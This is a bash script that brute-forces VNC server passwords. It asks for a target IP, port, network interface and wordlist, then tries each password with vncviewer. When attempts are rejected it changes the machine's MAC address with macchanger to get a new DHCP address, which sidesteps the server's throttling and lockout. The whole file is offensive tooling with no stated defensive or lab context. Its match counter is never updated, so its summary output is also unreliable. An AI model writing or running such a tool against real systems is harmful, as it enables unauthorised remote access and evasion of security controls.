#!/bin/bash
# NEED WAY TO CLEAR PAST CONNECTIONS, NEW CONNECTIONS WONT GO THROUGH DUE TO PAST CONNECTIONS TAKING UP ALL 3 POSSIBLE REQUESTS.
read -p "IP4 Address: " ipadd
read -p "Access Port (default:5900): " port
read -p "Network Interface: " interface
read -p "Password File Name: " file_name
connection=0
echo
echo -e "\033[34mTrying...\033[0m"
echo 
vncviewer $ipadd:$port > stdout.txt 2>&1 &
window_up=0
tries=0
while [ $window_up -eq 0 ]; 
do
	if ps aux | grep -q "vncviewer"; then
		window_up=1
	fi
	sleep 0.1
	count=$((count+1))
	if [[ count -eq 60 ]]; then
		window_up=-1
		pkill -f "vncviewer"
	fi
done

if grep -q "Connected to host" stdout.txt; then
                        echo -e "\033[32m[Established Connection]\033[0m"
                        echo
                        connection=1
                        pkill -f "vncviewer"
                else
                        echo -e "\033[31mUnable to connect\033[0m"
                        pkill -f "vncviewer"
                fi
dhcp_hop(){
        prev_ip=$(hostname -I)
        ifconfig "$interface" down
        sudo macchanger "$interface" -r 2>&1
        ifconfig "$interface" up
        new=0
        while [ $new -eq 0 ];
        do
                if [[ "$(hostname -I)" == "$prev_ip" ]]
                then
			sleep 0.1 
                else
                        new=1
                fi
        done
}

if [[ connection -eq 1 ]]
then
	pws=0
	match=0
	while read -r line; do
		pws=$((pws+1))
		echo "Trying: ${line}"
		vncviewer -passwd <(vncpasswd -f <<<"$line") $ipadd:$port > stdout.txt 2>&1 &
		sleep 1 # avoid throttling
		if netstat -na | grep 5900 | grep "TIME_WAIT"
		then
			pkill -f "vncviewer"
			cat stdout.txt
			if grep -q "rejected" stdout.txt
			then	
				sleep 1 #must wait for query timeout
				dhcp_hop
				echo $(hostname -I)
			fi
		elif netstat -na | grep 5900 | grep ESTABLISHED
		then
			echo "MATCH FOUND: ${line}"
		else
			echo "Failed"
			pkill -f "vncviewer"
		fi
	done < "$file_name"

	if  [ "$match" -eq 0 ]
	then
	echo "${pws} Passwords tried, 0 matches found."
	elif [ "$match" -eq 1 ] 
	then
		echo "${pws} Passwords tried, 1 match found."
	fi 
fi
